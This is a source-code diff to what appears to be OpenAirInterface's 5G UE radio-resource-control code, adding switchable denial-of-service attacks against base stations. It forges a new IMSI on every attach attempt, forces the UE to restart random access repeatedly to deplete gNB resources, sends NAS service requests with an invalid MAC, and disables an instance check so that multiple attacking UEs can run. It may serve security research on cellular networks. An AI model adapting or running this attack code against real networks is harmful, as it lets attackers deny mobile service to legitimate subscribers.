@@ -71,6 +71,16 @@
 
 #include "nr_nas_msg_sim.h"
 
+#include "executables/softmodem-common.h"	/* IS_SOFTMODEM_RFSIM */
+#include "attack_extern.h"      /* bts_attack, bts_delay, dnlink_dos_attack, uplink_dos_attack, rep_conn_end_count, null_cipher_integ */
+#include <stdlib.h>             /* srand () and rand () for _ra_restart_counter*/
+#include "PHY/phy_extern_nr_ue.h" /* PHY_vars_UE_g */
+#include "PHY/INIT/nr_phy_init.h"
+
+// New attack variables
+static unsigned int _btsIMSIByte = 0;
+static int _ra_restart_counter = 0;
+
 static NR_UE_RRC_INST_t *NR_UE_rrc_inst;
 /* NAS Attach request with IMSI */
 static const char nr_nas_attach_req_imsi_dummy_NSA_case[] = {
@@ -132,6 +142,14 @@ static const char nr_nas_attach_req_imsi_dummy_NSA_case[] = {
     0x27,
     0x11,
 };
+
+/* NAS Service request with IMSI for uplink DoS attack */
+static const char _nas_service_request[] = {
+  0x7e, 0x00, 0x4c,
+  0x4, // KSI and sequence number
+  0xff, 0xff // Short MAC (Invalid)
+};
+
 
 static void nr_rrc_manage_rlc_bearers(const NR_UE_RRC_INST_t *rrc,
                                       const NR_CellGroupConfig_t *cellGroupConfig,
@@ -593,6 +611,10 @@ static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
 {
   LOG_D(NR_RRC, "Generation of RRCSetupRequest\n");
   uint8_t rv[6];
+
+  LOG_I(RRC, "ra_restart_counter: %d\n", _ra_restart_counter);
+  srand(_ra_restart_counter+1);
+
   // Get RRCConnectionRequest, fill random for now
   // Generate random byte stream for contention resolution
   for (int i = 0; i < 6; i++) {
@@ -600,9 +622,11 @@ static void nr_rrc_ue_prepare_RRCSetupRequest(NR_UE_RRC_INST_t *rrc)
     // if SMBV is configured the contention resolution needs to be fix for the connection procedure to succeed
     rv[i] = i;
 #else
-    rv[i] = taus() & 0xff;
+    // rv[i] = taus() & 0xff;
+    rv[i]=rand() % 0xFF; //taus()&0xff; // new: introduce some randomness to different UEs
 #endif
   }
+  ++_ra_restart_counter;
 
   uint8_t buf[1024];
   int len = do_RRCSetupRequest(buf, sizeof(buf), rv);
@@ -819,8 +843,21 @@ static void rrc_ue_generate_RRCSetupComplete(const NR_UE_RRC_INST_t *rrc, const 
     as_nas_info_t initialNasMsg;
     nr_ue_nas_t *nas = get_ue_nas_info(rrc->ue_id);
     generateRegistrationRequest(&initialNasMsg, nas);
+    if (bts_attack >= 5) {
+      LOG_E(RRC, "[BTS_ATTACK_ITEM_01]: Create a unique IMSI for each RRC attach attempt\n");
+      // Create a unique (monotonically increasing) IMSI for each attach (n.b., BCD encoding, below)
+      initialNasMsg.data[17] = (_btsIMSIByte % 10) | ((_btsIMSIByte / 10) << 4);
+      if (++_btsIMSIByte == 100)
+	      _btsIMSIByte = 0;
+    }
     nas_msg = (char*)initialNasMsg.data;
     nas_msg_length = initialNasMsg.length;
+    
+    if (uplink_dos_attack /* != 0 */) {
+      LOG_E(RRC, "[Uplink DoS] encoding service request with invalid MAC\n");
+      nas_msg = _nas_service_request;
+      nas_msg_length = sizeof(_nas_service_request);
+    }
   } else {
     nas_msg = nr_nas_attach_req_imsi_dummy_NSA_case;
     nas_msg_length = sizeof(nr_nas_attach_req_imsi_dummy_NSA_case);
@@ -1387,7 +1424,12 @@ void *rrc_nrue(void *notUsed)
   LOG_D(NR_RRC, "[UE %ld] Received %s\n", instance, ITTI_MSG_NAME(msg_p));
 
   NR_UE_RRC_INST_t *rrc = &NR_UE_rrc_inst[instance];
-  AssertFatal(instance == rrc->ue_id, "Instance %ld received from ITTI doesn't matach with UE-ID %ld\n", instance, rrc->ue_id);
+  if (instance != rrc->ue_id && (bts_attack >= 5 || blind_dos_attack > 0)) {
+    return NULL;
+  }
+  else {
+    AssertFatal(instance == rrc->ue_id, "Instance %ld received from ITTI doesn't matach with UE-ID %ld\n", instance, rrc->ue_id);
+  }
 
   switch (ITTI_MSG_ID(msg_p)) {
   case TERMINATE_MESSAGE:
@@ -1469,6 +1511,64 @@ void *rrc_nrue(void *notUsed)
     break;
 
   case NAS_UPLINK_DATA_REQ: {
+    LOG_E(RRC, "[NAS MSG]: NAS_UPLINK_DATA_REQ\n");
+
+    // Trigger log when we see a non-attack NAS message length
+    if (!IS_SOFTMODEM_RFSIM && (bts_attack >=5 || blind_dos_attack /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length != -1) {
+      const char *_logAtt = blind_dos_attack /* > 0 */ ? "BLIND_DOS_ATTACK" : "BTS_ATTACK";
+      LOG_E(RRC, "[%s NAS_UPLINK_DATA_REQ]: NAS Message Length = %i\n", _logAtt, NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length);
+    }
+                      
+    if ((bts_attack >=5 || blind_dos_attack /* > 0 */) && NAS_UPLINK_DATA_REQ (msg_p).nasMsg.length == -1) {
+      const char *_logEAtt;
+      const char *_logIAtt;
+
+      if (blind_dos_attack /* > 0 */) {
+        _logEAtt = "BLIND_DOS_ATTACK_ITEM_03";
+        _logIAtt = "Blind DOS";
+      }
+      else {
+        _logEAtt = "BTS_ATTACK_ITEM_03";
+        _logIAtt = "BTS Resource Depletion";
+      }
+      LOG_E(RRC, "[%s]: Generating NAS UL Data Request, revert back to PRACH (primary attack functionality)\n", _logEAtt);
+      usleep(bts_delay * 1000);
+
+      LOG_I(RRC, "ra_restart_counter: %d\n", _ra_restart_counter);
+      if (_ra_restart_counter <= 0)
+        break; // The UE will generate Attach req upon starting, so filter it...
+      int gNB_index = 0; // TODO: Is it ok to hardcode the gNB index?
+      int CC_id = 0; // use 0 for carrier ID?
+      int module_id = 0; // hardcode // ctxt.module_id;
+      LOG_I(RRC, "[%s] Receive communication back from NAS, UE restarting random access procedure\n", _logIAtt);
+      // reset UE parameters at PHY Layer, PHY_VARS_NR_UE
+      init_nr_ue_transport(PHY_vars_UE_g[module_id][CC_id]);
+      PHY_vars_UE_g[module_id][CC_id]->prach_vars[gNB_index]->active = false;
+
+      // MAC Layer
+      NR_UE_MAC_INST_t *mac = get_mac_inst(module_id);
+      // RRC Layer
+      // nr_rrc_set_state(module_id, RRC_STATE_IDLE_NR);
+      NR_UE_rrc_inst[module_id].nrRrcState = RRC_STATE_IDLE_NR;
+      // NR_UE_rrc_inst[module_id].Srb0[gNB_index].Tx_buffer.payload_size = 0; // clear Srb0 buffer
+      // NR_UE_rrc_inst[module_id].Srb0[gNB_index].Rx_buffer.payload_size = 0;
+
+      // Ref: openair2/LAYER2/NR_MAC_UE/nr_ra_procedures.c nr_ra_failed()
+      // restart RA Procedure
+      RA_config_t *ra = &mac->ra;
+      init_RA(mac, &ra->prach_resources, mac->current_UL_BWP->rach_ConfigCommon, &mac->current_UL_BWP->rach_ConfigCommon->rach_ConfigGeneric, ra->rach_ConfigDedicated);
+      nr_get_RA_window(mac);
+      // mac->state = UE_PERFORMING_RA;
+      ra->RA_active = 1;
+      ra->ra_rnti = 0;
+      ra->t_crnti = 0;
+      ra->RA_contention_resolution_timer_active = 0;
+      ra->ra_state = RA_UE_IDLE;
+      break;
+    }
+
+    LOG_E(RRC, "[NORMAL PROCESSING]: Generating NAS UL Data Request\n");
+    
     uint32_t length;
     uint8_t *buffer;
     NasUlDataReq *req = &NAS_UPLINK_DATA_REQ(msg_p);
